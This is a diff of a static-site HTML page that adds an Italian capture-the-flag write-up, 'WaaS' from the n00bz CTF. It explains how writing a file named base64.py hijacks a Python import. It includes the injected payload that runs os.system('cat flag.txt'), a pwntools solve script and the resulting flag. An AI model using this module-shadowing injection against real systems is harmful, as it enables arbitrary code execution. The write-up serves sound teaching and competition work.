@@ -20,7 +20,7 @@
     <meta charset="utf-8">
     <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Tags - ByteTheCookies</title>
+    <title>WaaS - ByteTheCookies</title>
 
     
 
@@ -31,22 +31,41 @@
     
 
     
-        <meta property="og:url" content="http://localhost:1313/it/tags/">
+        <meta property="og:url" content="http://localhost:1313/it/writeups/noobzctf/waas/">
   <meta property="og:site_name" content="ByteTheCookies">
-  <meta property="og:title" content="Tags">
+  <meta property="og:title" content="WaaS">
+  <meta property="og:description" content="Waas Descrizione: Writing as a Service!
+Autori: NoobMaster &#43; NoobHacker
+Punti: 491
+Soluzioni: 78
+Introduction WaaS (Writing as a Service) ci permette di sovrascrivere un file sul sistema (dopo un certo controllo dell’input) e di inserirvi tutto ciò che vogliamo (fino a quando non si incontra un newline).
+import subprocess from base64 import b64decode as d while True: print(&#34;[1] Write to a file\n[2] Get the flag\n[3] Exit&#34;) try: inp = int(input(&#34;Choice: &#34;).">
   <meta property="og:locale" content="it">
-  <meta property="og:type" content="website">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:modified_time" content="2024-08-06T11:27:07+02:00">
+    <meta property="article:tag" content="Misc">
+    <meta property="article:tag" content="Python">
 
     
 
     
         
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Tags">
+  <meta name="twitter:title" content="WaaS">
+  <meta name="twitter:description" content="Waas Descrizione: Writing as a Service!
+Autori: NoobMaster &#43; NoobHacker
+Punti: 491
+Soluzioni: 78
+Introduction WaaS (Writing as a Service) ci permette di sovrascrivere un file sul sistema (dopo un certo controllo dell’input) e di inserirvi tutto ciò che vogliamo (fino a quando non si incontra un newline).
+import subprocess from base64 import b64decode as d while True: print(&#34;[1] Write to a file\n[2] Get the flag\n[3] Exit&#34;) try: inp = int(input(&#34;Choice: &#34;).">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
 
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
 
 
 
@@ -73,6 +92,20 @@
 
 
 
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
 
 
 
@@ -257,7 +290,7 @@
                     
                         <a href="/it/news/" class="pure-menu-link">Novità</a>
                     
-                </li><li class="navbar-item pure-menu-item ">
+                </li><li class="navbar-item pure-menu-item insection">
                     
                         <a href="/it/writeups/" class="pure-menu-link">Writeups</a>
                     
@@ -273,92 +306,110 @@
 </nav>
 <main>
             <div id="content" class="content-margin">
-                <div class="content-margin">
-    <h1>Tags</h1>
-    <div>
+                
     
-    
-    
+    <div class="collapsible-menu-wrapper"><div class="collapsible-menu-type"><span>Table of contents</span></div><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        
+    </div></div>
 
-    
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-    
 
+
+    <div class="content-margin">
+
+
+
+<article >
     
     
-
-    <div>
         
-            
-            
-            
-
-            <a class="term-item" href="/it/tags/python/" style="line-height:2.1824240713393066rem">
-                <span style="font-size:1.3324240713393067rem">Python</span>
-                <span style="font-size:0.675rem"> (2) </span>
-            </a>
         
-            
-            
-            
+    
+    
+<h1>Waas</h1>
 
-            <a class="term-item" href="/it/tags/ctf/" style="line-height:1.725rem">
-                <span style="font-size:0.875rem">CTF</span>
-                <span style="font-size:0.675rem"> (1) </span>
-            </a>
-        
-            
-            
-            
+<p><strong>Descrizione</strong>: Writing as a Service!</p>
+<p><strong>Autori</strong>: NoobMaster + NoobHacker</p>
+<p><strong>Punti</strong>: 491</p>
+<p><strong>Soluzioni</strong>: 78</p>
 
-            <a class="term-item" href="/it/tags/misc/" style="line-height:1.725rem">
-                <span style="font-size:0.875rem">Misc</span>
-                <span style="font-size:0.675rem"> (1) </span>
-            </a>
-        
-            
-            
-            
+<h2>Introduction</h2>
 
-            <a class="term-item" href="/it/tags/n00bz/" style="line-height:1.725rem">
-                <span style="font-size:0.875rem">N00bz</span>
-                <span style="font-size:0.675rem"> (1) </span>
-            </a>
-        
-            
-            
-            
+<p>WaaS (Writing as a Service) ci permette di sovrascrivere un file sul sistema (dopo un certo controllo dell&rsquo;input) e di inserirvi tutto ciò che vogliamo (fino a quando non si incontra un newline).</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import subprocess
+from base64 import b64decode as d
+while True:
+        print(&quot;[1] Write to a file\n[2] Get the flag\n[3] Exit&quot;)
+        try:
+                inp = int(input(&quot;Choice: &quot;).strip())
+        except:
+                print(&quot;Invalid input!&quot;)
+                exit(0)
+        if inp == 1:
+                file = input(&quot;Enter file name: &quot;).strip()
+                assert file.count('.') &lt;= 2 # Why do you need more?
+                assert &quot;/proc&quot; not in file # Why do you need to write there?
+                assert &quot;/bin&quot; not in file # Why do you need to write there? 
+                assert &quot;\n&quot; not in file # Why do you need these?
+                assert &quot;chall&quot; not in file # Don't be overwriting my files!
+                try: 
+                        f = open(file,'w')
+                except:
+                        print(&quot;Error! Maybe the file does not exist?&quot;)
 
-            <a class="term-item" href="/it/tags/template-injection/" style="line-height:1.725rem">
-                <span style="font-size:0.875rem">Template Injection</span>
-                <span style="font-size:0.675rem"> (1) </span>
-            </a>
-        
-            
-            
-            
+                f.write(input(&quot;Data: &quot;).strip())
+                f.close()
+                print(&quot;Data written sucessfully!&quot;)
 
-            <a class="term-item" href="/it/tags/web/" style="line-height:1.725rem">
-                <span style="font-size:0.875rem">Web</span>
-                <span style="font-size:0.675rem"> (1) </span>
-            </a>
-        
-    </div>
+        if inp == 2:
+                flag = subprocess.run([&quot;cat&quot;,&quot;fake_flag.txt&quot;],capture_output=True) # You actually thought I would give the flag?
+                print(flag.stdout.strip())
+</code></pre>
 
+<h2>Solution</h2>
+
+<p>In un primo momento si potrebbe pensare di provare a bypassare la validazione dell&rsquo;input, magari riscrivendo il funzionamento del comando cat o del file di sfida stesso, ma questo non è possibile.
+Una cosa molto bizzarra è l&rsquo;importato ma inutilizzato <code>b64decode</code> dal modulo <code>base64</code>, che è ciò che ci permette di risolvere la sfida.</p>
+<p>Quando python importa i moduli, guarda in <code>sys.path</code>, che ha un elenco di directory valide da cui importare i moduli. Dopo una rapida ricerca nei <a href="https://docs.python.org/3/library/sys_path_init.html">python3 docs</a>, scopriamo che la prima directory in cui cerca è la stessa directory in cui si trova il file, il che significa che se abbiamo un file <code>base64.py</code> nella directory, allora python cercherà di importare un simbolo <code>b64decode</code> da quel file, invece del comune modulo conosciuto.
+Un&rsquo;altra caratteristica del comportamento di importazione di python che possiamo usare è che tutto il codice di un modulo importato sarà eseguito. Per esempio, se un file <code>test.py</code> ha <code>print('Hello, World!')</code> e può essere eseguito (per esempio se è al livello di indentazione più basso), un file con <code>import test</code> vedrà effettivamente <code>Hello, World!</code> stampato su <code>stdout</code>.
+Pertanto, poiché la funzione <code>open</code> con un flag <code>'w' creerà un file se non esiste, possiamo semplicemente creare un file chiamato</code>base64.py` e scriverci dentro il nostro codice malevolo.</p>
+<p>Qualcosa del genere farà al caso vostro:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import os; b64decode = 0; os.system(&quot;cat flag.txt&quot;)
+</code></pre>
+<p>Ma il flag non è ancora nostro; dobbiamo sfruttare il fatto che l&rsquo;istanza non resetta i suoi file ogni volta che ci si connette, il che significa che il nostro <code>base64.py</code> rimarrà nella cartella per tutta la durata dell&rsquo;istanza. Questo significa che dobbiamo semplicemente riconnetterci e ottenere il nostro flag.</p>
+<p><code>solve.py</code></p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">from pwn import *
+
+def solve():
+  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance
+
+  r.sendlineafter(b'Choice: ', b'1') # 1 to write a file
+  r.sendlineafter(b'Enter file name: ', b'base64.py')
+  r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(&quot;cat flag.txt&quot;)')
+
+  r.close()
+
+  r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance
+  flag = r.recvline().decode()
+  print(f'flag: {flag}')
+  r.close()
+
+if __name__ == '__main__':
+  solve()
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-text">$ flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e}
+</code></pre>
+<p align="right">Author: vympel</p>
+
+</article>
 </div>
-</div>
+
 
                 
                     
